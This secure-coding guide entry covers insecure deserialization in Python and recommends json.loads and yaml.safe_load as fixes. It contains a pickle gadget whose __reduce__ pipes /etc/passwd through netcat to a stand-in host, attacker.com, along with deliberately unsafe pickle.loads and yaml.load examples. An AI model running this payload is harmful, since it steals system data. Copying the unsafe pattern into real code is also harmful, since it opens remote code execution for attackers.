---
id: TG-INPUT-008
title: Insecure Object Deserialization
category: input-validation
severity: Critical
confidence: Confirmed
frameworks:
  - django
  - flask
  - fastapi
  - stdlib
cwe: CWE-502
asvs_v4: V5.5.1
nist_ssdf: PW.5.1
---

# TG-INPUT-008: Insecure Object Deserialization

## 🚨 Problem Statement
Deserializing untrusted data with formats that support code execution (`pickle.loads`, `yaml.load` without `SafeLoader`, `marshal`, `shelve`) allows remote attackers to execute arbitrary code via object instantiation hooks like `__reduce__`.

---

## 💥 Adversarial Threat & Exploitation
An attacker submits a pickled payload containing a crafted gadget:
```python
class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /etc/passwd | nc attacker.com 4444',))
```
When `pickle.loads(untrusted_bytes)` runs, the arbitrary system command is immediately executed.

---

## 🛠️ Framework-Native Remediations

### 🐍 Python
#### ❌ Unsafe Pattern
```python
data = pickle.loads(request.body)
config = yaml.load(user_upload, Loader=yaml.Loader)
```

#### ✅ Safe Remediation
```python
import json
import yaml

# Safe: Standard structured serialization formats
data = json.loads(request.body)
config = yaml.safe_load(user_upload)
```
